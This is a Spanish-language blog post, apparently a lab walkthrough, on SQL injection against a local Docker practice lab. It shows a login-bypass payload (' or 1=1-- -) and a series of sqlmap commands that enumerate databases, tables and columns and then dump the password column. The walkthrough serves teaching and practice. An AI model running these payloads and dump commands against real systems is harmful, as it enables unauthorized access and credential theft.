---
title: SQLinjection
excerpt: SQLinyection
publishDate: 'Oct 09 2025'
tags:
  - SQL injection
seo:
  image:
    src: '/sql.png'
    alt: Imagen creada con Chat GPT
---

![sql](/sql.png)

***Resumen***: Una inyección SQL es un entorno mal configurado permitiéndonos así hacer consultas a la base de datos obteniendo información relevante.

***Nota***: El laboratorio utilizado en este post será desplegado con **Docker** y se puede encontrar en el siguiente enlace: [laboratorio](https://github.com/yuyudhn/SQLi-Labs-Docker).Y se usará la herramienta automatizada [SQLmap](https://sqlmap.org).

## Procedimiento

Desplegamos el laboratorio y vemos que tenemos un panel de login, así que comprobamos manualmente si la inyección nos da un error confirmando así que es vulnerable.
 ```bash
 ' or 1=1-- -
 ````
[![Bypass](/Bypass_sql.png)](/Bypass_sql.png)
 
 En este caso lo que ha hecho la sentencia es un bypass del login permitiéndono saltarnos la autenticación. Pero como lo que nos interesa es sacar contraseñas y nombres de usuario, vamos a tirar de SQLmap.

## Averiguando nombres de bases de datos existentes

SQLmap ya viene preinstalada en nuestro Kali, por lo que no tenemos nada más que ejecutar la herramienta.
Para averiguar las bases de datos existentes el comando es el siguiente:

``` bash
  sqlmap --url url --dbs --forms --batch 
```
Aquí lo que hacemos es pasarle a la herrmienta una url y decirle que queremos buscar bases de datos usando para ello los formularios existentes.

[![bases_datos](/bases_datos.png)](/bases_datos.png)

Vemos como nos encuentra los nombres muy rápido. Ahora y suponiendo que se tiene una base de como estan compuestas las bases de datos, vamos a ir escalando por sus distintas partes hasta llegar a sacar el password.

## Ver tablas existentes

Vamos a ver las tablas de las que se compone la bse de datos **evangelion_sqli**.

```bash
sqlmap --url http://localhost:1337/dashboard/auth.php -D evangelion_sqli --tables --forms --batch
```
[![tablas](/tablas_sql.png)](/tablas_sql.png)

Vemos que tenemos dos tablas: Info y Users, nos centraremos en la segunda. Vamos a ver sus columnas.

## Ver columnas

Lo hacemos con el siguiente comando:

```bash
sqlmap --url url -D nombre_db -T users --columns --forms --batch
```
Vemos que nos saca varias columnas, y la que nos interesa es password.

[![columnas](/columnas.png)](/columnas.png)

## Ver contenido de password

Vamos a ver que contiene el campo password, lo haremos cambiando un poco el comando.

```bash
sqlmap --url 'http://localhost:1337/dashboard/auth.php/' -D evangelion_sqli -T Users -C nombre_columna --dump --dbs --forms --batch
```

Y ahí vemos las credenciales.

[![credenciales](/credenciales.png)](/credenciales.png)



